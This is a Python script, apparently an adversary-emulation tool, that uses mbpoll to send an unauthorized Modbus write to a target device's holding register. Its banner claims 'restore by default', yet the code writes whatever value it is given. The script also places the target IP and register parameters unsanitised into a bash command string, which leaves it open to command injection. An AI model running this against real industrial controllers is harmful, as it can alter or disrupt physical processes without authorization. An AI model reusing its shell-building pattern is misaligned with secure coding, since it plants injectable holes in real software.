#!/usr/bin/env python3
import json
import subprocess
import sys

target_ip = sys.argv[1] if len(sys.argv) > 1 else ""
params = {}
if len(sys.argv) > 3:
    try:
        params = json.loads(sys.argv[3])
    except Exception:
        params = {}

register = params.get("register", 18)
value = params.get("value", 1)
command = (
    f"if command -v mbpoll >/dev/null 2>&1; then "
    f"mbpoll -m tcp -a 1 -r {register} -t 4:int {target_ip} {value}; "
    f"else echo '[INFO] mbpoll not available; simulated unauthorized command message'; fi"
)

print("===========================================")
print("ATT&CK PROFILE: T1692.001 - Unauthorized Command Message")
print(f"TARGET: {target_ip}")
print(f"REGISTER: {register}")
print(f"VALUE: {value}")
print("MODE: RESTORE BY DEFAULT")
print("===========================================")

result = subprocess.run(["bash", "-lc", command], check=False)
if result.returncode != 0:
    print("[FAIL] Unauthorized command message workflow failed")
    sys.exit(1)
print("[SUCCESS] Controlled unauthorized command message completed")
